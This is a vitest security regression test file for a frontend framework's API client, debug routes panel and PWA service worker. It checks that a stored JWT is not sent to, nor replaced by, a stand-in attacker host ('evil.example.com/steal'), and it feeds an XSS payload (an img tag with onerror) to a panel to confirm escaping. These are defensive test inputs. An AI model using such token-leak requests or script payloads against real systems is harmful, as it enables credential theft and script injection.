import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { api } from '../src/api/fetch';
import { renderRoutesPanel } from '../src/debug/panels/routes';
import { routeTracker } from '../src/debug/trackers';
import { pwa } from '../src/pwa/pwa';

describe('API1/RTC1: token is only sent to a trusted origin', () => {
  let fetchMock: ReturnType<typeof vi.fn>;
  const originalFetch = globalThis.fetch;
  beforeEach(() => {
    fetchMock = vi.fn(async () => ({
      ok: true, status: 200, headers: new Headers({ 'Content-Type': 'application/json' }),
      json: async () => ({}), text: async () => '{}',
    }));
    globalThis.fetch = fetchMock as unknown as typeof fetch;
    localStorage.clear();
    api._reset();
  });
  afterEach(() => { globalThis.fetch = originalFetch; });

  it('does NOT attach the Bearer token to an absolute foreign URL', async () => {
    localStorage.setItem('tina4_token', 'secret-jwt');
    api.configure({ baseUrl: '', auth: true, tokenKey: 'tina4_token' });
    await api.get('https://evil.example.com/steal');
    const [, init] = fetchMock.mock.calls[0];
    const auth = (init?.headers ?? {})['Authorization'];
    expect(auth).toBeUndefined();
  });

  it('attaches the Bearer token to a baseUrl-origin request', async () => {
    localStorage.setItem('tina4_token', 'secret-jwt');
    api.configure({ baseUrl: 'https://api.example.com', auth: true, tokenKey: 'tina4_token' });
    await api.get('/data');
    const [, init] = fetchMock.mock.calls[0];
    expect((init?.headers ?? {})['Authorization']).toBe('Bearer secret-jwt');
  });

  it('does NOT accept a FreshToken from a foreign origin', async () => {
    fetchMock.mockResolvedValueOnce({
      ok: true, status: 200,
      headers: new Headers({ 'Content-Type': 'application/json', FreshToken: 'planted' }),
      json: async () => ({}), text: async () => '{}',
    });
    api.configure({ baseUrl: '', auth: true, tokenKey: 'tina4_token' });
    await api.get('https://evil.example.com/x');
    expect(localStorage.getItem('tina4_token')).not.toBe('planted');
  });
});

describe('D1: debug routes panel escapes params', () => {
  it('escapes a param value with markup', () => {
    routeTracker.onNavigate({ path: '/item/x', params: { id: '<img src=x onerror=alert(1)>' }, pattern: '/item/{id}', durationMs: 1 });
    const out = renderRoutesPanel();
    expect(out).not.toContain('<img src=x onerror');
    expect(out).toContain('&lt;img');
  });
});

describe('PWA1: service worker excludes authenticated /api GETs', () => {
  it('the generated SW skips /api and Authorization requests', () => {
    const sw = pwa.generateServiceWorker({ name: 'app' } as any);
    expect(sw).toContain("pathname.startsWith('/api')");
    expect(sw).toContain("headers.get('authorization')");
  });
});
